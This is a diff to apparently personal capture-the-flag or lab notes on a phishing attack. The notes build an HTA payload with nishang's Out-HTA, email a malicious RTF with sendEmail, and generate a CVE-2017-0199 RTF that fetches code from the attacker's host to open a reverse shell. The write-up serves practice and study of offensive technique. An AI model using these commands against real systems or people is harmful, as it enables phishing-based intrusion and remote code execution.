@@ -106,7 +106,7 @@ Will load the PowerShell and execute the Command
 
 
 ```
-Out-HTA -PayloadURL http://10.10.14.17/singh.ps1
+Out-HTA -PayloadURL http://10.10.16.20/singh.ps1
 ```
 ![[Pasted image 20240509150921.png]]
 
@@ -275,7 +275,12 @@ https://github.com/samratashok/nishang
 ```
 
 Finally the script ran and we are good to go
+As you can see in the image i have used the wrong IP address so i was getting hit on the file but was not getting the reverse shell
+```
+Out-HTA -PayloadURL http://10.10.16.20/singh.ps1
+```
 ![[Pasted image 20240509172043.png]]
+![[Pasted image 20240510015653.png]]
 
 Now we to copy the scripts in reel folder
 
@@ -284,3 +289,16 @@ Now we have the rtf file that we have to send to someone that will contain the l
 
 We will use a tool called send sendEmail to send the payload to nico.
 ![[Pasted image 20240510013451.png]]
+
+We have fire up the file server as well as started the Netcat Listener.
+```
+sendEmail -f singh@megabank.com -t nico@megabank.com -u RTF -m "Please Convert This File" -a singh.rtf -s 10.10.10.77
+```
+![[Pasted image 20240510014134.png]]
+We didn't got the shell as we are getting / so we have to solve this problem.
+
+Will regenerate the CVE file
+```
+python cve-2017-0199_toolkit.py -M gen -w singh.rtf -u 'http://10.10.16.20/singh.hta' -t RTF -x 0
+```
+
